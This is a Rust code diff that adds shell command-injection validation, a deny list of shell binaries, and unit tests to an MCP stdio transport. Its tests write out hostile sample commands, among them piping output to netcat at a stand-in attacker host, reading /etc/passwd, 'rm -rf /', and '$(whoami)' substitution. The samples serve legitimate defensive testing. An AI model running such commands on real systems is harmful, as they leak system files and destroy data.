@@ -56,6 +56,9 @@ pub enum TransportError {
 
     #[error("Invalid URL: {0}")]
     InvalidUrl(String),
+
+    #[error("Command validation failed: {0}")]
+    CommandValidation(String),
 }
 
 // ============================================================================
@@ -197,6 +200,122 @@ pub fn validate_url_for_ssrf(url: &str) -> Result<(), TransportError> {
     Ok(())
 }
 
+// ============================================================================
+// Command Validation (Injection Prevention)
+// ============================================================================
+
+/// Shell metacharacters that could be used for command injection
+const SHELL_METACHARACTERS: &[char] = &[
+    ';',  // Command separator
+    '|',  // Pipe
+    '&',  // Background/AND
+    '$',  // Variable expansion
+    '`',  // Command substitution
+    '(',  // Subshell
+    ')',  // Subshell
+    '{',  // Brace expansion
+    '}',  // Brace expansion
+    '<',  // Redirection
+    '>',  // Redirection
+    '\n', // Newline (command separator)
+    '\r', // Carriage return
+];
+
+/// Characters that are suspicious in commands but not always dangerous
+const SUSPICIOUS_CHARACTERS: &[char] = &[
+    '!',  // History expansion
+    '~',  // Home expansion (usually safe but can be abused)
+    '*',  // Glob
+    '?',  // Glob
+    '[',  // Glob pattern
+    ']',  // Glob pattern
+];
+
+/// Validate a command for injection safety
+///
+/// This function checks that a command:
+/// - Does not contain shell metacharacters that could enable injection
+/// - Does not start with suspicious prefixes
+///
+/// Returns `Ok(())` if the command is safe, or an error describing why it's blocked.
+pub fn validate_command_for_injection(command: &str) -> Result<(), TransportError> {
+    // Empty command is invalid
+    if command.is_empty() {
+        return Err(TransportError::CommandValidation(
+            "Command cannot be empty".to_string(),
+        ));
+    }
+
+    // Check for shell metacharacters
+    for &c in SHELL_METACHARACTERS {
+        if command.contains(c) {
+            let char_display = match c {
+                '\n' => "\\n".to_string(),
+                '\r' => "\\r".to_string(),
+                _ => c.to_string(),
+            };
+            return Err(TransportError::CommandValidation(format!(
+                "Command contains forbidden shell metacharacter '{}'",
+                char_display
+            )));
+        }
+    }
+
+    // Warn about suspicious characters (but don't block for now - some legitimate uses)
+    for &c in SUSPICIOUS_CHARACTERS {
+        if command.contains(c) {
+            tracing::warn!(
+                command = %command,
+                character = %c,
+                "Command contains suspicious character - consider using absolute paths"
+            );
+        }
+    }
+
+    // Block commands that try to invoke a shell directly
+    let shell_commands = ["sh", "bash", "zsh", "fish", "csh", "ksh", "dash", "cmd", "powershell", "pwsh"];
+
+    // Get the command basename
+    let basename = std::path::Path::new(command)
+        .file_name()
+        .and_then(|s| s.to_str())
+        .unwrap_or(command);
+
+    for shell in shell_commands {
+        if basename == shell || basename == format!("{}.exe", shell) {
+            return Err(TransportError::CommandValidation(format!(
+                "Direct shell execution '{}' is not allowed - specify the actual MCP server command",
+                command
+            )));
+        }
+    }
+
+    Ok(())
+}
+
+/// Validate command arguments for injection safety
+///
+/// Checks that arguments don't contain shell metacharacters.
+pub fn validate_args_for_injection(args: &[String]) -> Result<(), TransportError> {
+    for (i, arg) in args.iter().enumerate() {
+        for &c in SHELL_METACHARACTERS {
+            if arg.contains(c) {
+                let char_display = match c {
+                    '\n' => "\\n".to_string(),
+                    '\r' => "\\r".to_string(),
+                    _ => c.to_string(),
+                };
+                return Err(TransportError::CommandValidation(format!(
+                    "Argument {} contains forbidden shell metacharacter '{}'",
+                    i,
+                    char_display
+                )));
+            }
+        }
+    }
+    Ok(())
+}
+
 /// MCP JSON-RPC message
 ///
 /// Represents a JSON-RPC 2.0 message used in the Model Context Protocol.
@@ -306,7 +425,26 @@ pub struct StdioTransport {
 }
 
 impl StdioTransport {
+    /// Spawn a subprocess with command validation
+    ///
+    /// Validates the command and arguments to prevent shell injection attacks.
+    ///
+    /// # Errors
+    /// Returns `TransportError::CommandValidation` if the command or arguments
+    /// contain shell metacharacters or attempt direct shell execution.
     pub async fn spawn(command: &str, args: &[String]) -> Result<Self, TransportError> {
+        validate_command_for_injection(command)?;
+        validate_args_for_injection(args)?;
+        Self::spawn_unchecked(command, args).await
+    }
+
+    /// Spawn a subprocess without command validation
+    ///
+    /// # Safety
+    /// This bypasses command injection protection. Only use when the command
+    /// is from a trusted source (e.g., hardcoded in the application or validated
+    /// through other means).
+    pub async fn spawn_unchecked(command: &str, args: &[String]) -> Result<Self, TransportError> {
         let mut child = Command::new(command)
             .args(args)
             .stdin(std::process::Stdio::piped())
@@ -1061,6 +1199,123 @@ mod tests {
 
         // Invalid URL
         assert!(validate_url_for_ssrf("not-a-url").is_err());
+    }
+
+    // ------------------------------------------------------------------------
+    // Command Injection Prevention Tests
+    // ------------------------------------------------------------------------
+
+    #[test]
+    fn test_command_injection_blocks_shell_metacharacters() {
+        // Semicolon (command separator)
+        assert!(validate_command_for_injection("echo; cat /etc/passwd").is_err());
+
+        // Pipe
+        assert!(validate_command_for_injection("cat | nc attacker.com").is_err());
+
+        // Background/AND
+        assert!(validate_command_for_injection("sleep 1 & cat secret").is_err());
+
+        // Variable expansion
+        assert!(validate_command_for_injection("echo $HOME").is_err());
+
+        // Command substitution
+        assert!(validate_command_for_injection("echo `whoami`").is_err());
+
+        // Subshell
+        assert!(validate_command_for_injection("(cat /etc/passwd)").is_err());
+
+        // Brace expansion
+        assert!(validate_command_for_injection("echo {a,b}").is_err());
+
+        // Redirection
+        assert!(validate_command_for_injection("cat < /etc/passwd").is_err());
+        assert!(validate_command_for_injection("echo > /tmp/file").is_err());
+
+        // Newlines (command separator)
+        assert!(validate_command_for_injection("echo\ncat /etc/passwd").is_err());
+    }
+
+    #[test]
+    fn test_command_injection_blocks_direct_shell() {
+        // Direct shell commands should be blocked
+        assert!(validate_command_for_injection("sh").is_err());
+        assert!(validate_command_for_injection("bash").is_err());
+        assert!(validate_command_for_injection("/bin/bash").is_err());
+        assert!(validate_command_for_injection("/usr/bin/bash").is_err());
+        assert!(validate_command_for_injection("zsh").is_err());
+        assert!(validate_command_for_injection("cmd").is_err());
+        assert!(validate_command_for_injection("powershell").is_err());
+    }
+
+    #[test]
+    fn test_command_injection_allows_safe_commands() {
+        // Normal MCP server commands should be allowed
+        assert!(validate_command_for_injection("node").is_ok());
+        assert!(validate_command_for_injection("/usr/bin/node").is_ok());
+        assert!(validate_command_for_injection("python").is_ok());
+        assert!(validate_command_for_injection("python3").is_ok());
+        assert!(validate_command_for_injection("/home/user/.local/bin/mcp-server").is_ok());
+        assert!(validate_command_for_injection("npx").is_ok());
+        assert!(validate_command_for_injection("uv").is_ok());
+    }
+
+    #[test]
+    fn test_command_injection_empty_command() {
+        assert!(validate_command_for_injection("").is_err());
+    }
+
+    #[test]
+    fn test_args_injection_blocks_metacharacters() {
+        // Arguments with shell metacharacters should be blocked
+        let bad_args = vec![
+            "-c".to_string(),
+            "cat /etc/passwd".to_string(),  // This is fine
+        ];
+        assert!(validate_args_for_injection(&bad_args).is_ok());
+
+        let bad_args = vec![
+            "-c".to_string(),
+            "cat; rm -rf /".to_string(),  // Semicolon in arg
+        ];
+        assert!(validate_args_for_injection(&bad_args).is_err());
+
+        let bad_args = vec![
+            "--script=$(whoami)".to_string(),  // Variable expansion
+        ];
+        assert!(validate_args_for_injection(&bad_args).is_err());
+    }
+
+    #[test]
+    fn test_args_injection_allows_safe_args() {
+        // Normal arguments should be allowed
+        let safe_args = vec![
+            "--port".to_string(),
+            "8080".to_string(),
+            "--config".to_string(),
+            "/path/to/config.json".to_string(),
+        ];
+        assert!(validate_args_for_injection(&safe_args).is_ok());
+
+        // Arguments with spaces should be fine (shell won't split them)
+        let safe_args = vec![
+            "path with spaces/server.js".to_string(),
+        ];
+        assert!(validate_args_for_injection(&safe_args).is_ok());
+    }
+
+    #[tokio::test]
+    async fn test_stdio_spawn_validates_command() {
+        // Shell commands should be blocked
+        let result = StdioTransport::spawn("bash", &["-c".to_string(), "echo test".to_string()]).await;
+        assert!(result.is_err());
+        if let Err(TransportError::CommandValidation(msg)) = result {
+            assert!(msg.contains("shell"));
+        }
+
+        // Commands with metacharacters should be blocked
+        let result = StdioTransport::spawn("echo; whoami", &[]).await;
+        assert!(result.is_err());
     }
 
     // ------------------------------------------------------------------------
